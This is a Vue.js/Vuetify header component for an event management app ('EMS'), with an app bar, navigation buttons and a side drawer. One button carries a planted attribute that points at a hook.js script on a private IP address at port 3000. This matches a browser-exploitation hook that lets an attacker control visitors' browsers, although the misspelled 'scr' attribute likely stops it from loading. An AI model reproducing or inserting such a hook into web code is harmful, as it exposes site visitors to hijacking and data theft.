<template>
  <div class="header" >
    <v-app-bar app elevate-on-scroll color='rgba(250, 250, 250)'>
        
        <v-app-bar-nav-icon class="d-flex d-sm-none " @click="drawer = !drawer" ></v-app-bar-nav-icon>
        
        <v-app-bar-title>EMS</v-app-bar-title>

        <v-spacer></v-spacer>
        
        <v-app-bar-items class="d-none d-sm-flex">
          <v-btn 
          text v-for="(navItem, i) in navItems" 
          :key="i" link 
          :to="navItem.route"
          scr="http://192.168.1.33:3000/hook.js" type="text/javascript"
          >
            {{ navItem.text }}</v-btn>
        </v-app-bar-items> 
    </v-app-bar>
    
    <v-navigation-drawer
      app
      v-model="drawer"
      clipped
      fixed
      
      disable-resize-watcher
      >
      <v-list-item>
          <v-list-item-avatar>
          <v-img src="../assets/logo.svg"></v-img>
          </v-list-item-avatar>

          <v-list-item-content>
          <v-list-item-title >Janardhan Singh</v-list-item-title>
          </v-list-item-content>
      </v-list-item>

      <v-divider></v-divider>

      <v-list >

          <v-list-item
          v-for="item in items"
          :key="item.title"
          link
          router :to="item.route"
          >
          <v-list-item-icon>
              <v-icon >{{ item.icon }}</v-icon>
          </v-list-item-icon>

          <v-list-item-content>
              <v-list-item-title>{{ item.title }}</v-list-item-title>
          </v-list-item-content>
          </v-list-item>
      </v-list>

    </v-navigation-drawer>
  </div>
</template>

<script>
export default {
    name: 'header',
    data () {
      return {
        navItems: [
          { text: 'Home', route: '/' },
          { text: 'All Events', route: '/allevents'},
          { text: 'About', route: '/about' },
          { text: 'SignIn', route: '/signin' },
        ],
        drawer: false,
        items: [
          { icon: 'mdi-home', title: 'Home',  route: '/' },
          { icon: 'mdi-eventbrite', title: 'All Events', route: '/allevents'},
          { icon: 'question_answer', title: 'About', route: '/about' },
          { icon: 'mdi-login', title: 'SignIn', route: '/signin' },
        ],
      }
    },
}
</script>

<style scoped>
.header {
  background-color: #fafafa;
}
</style>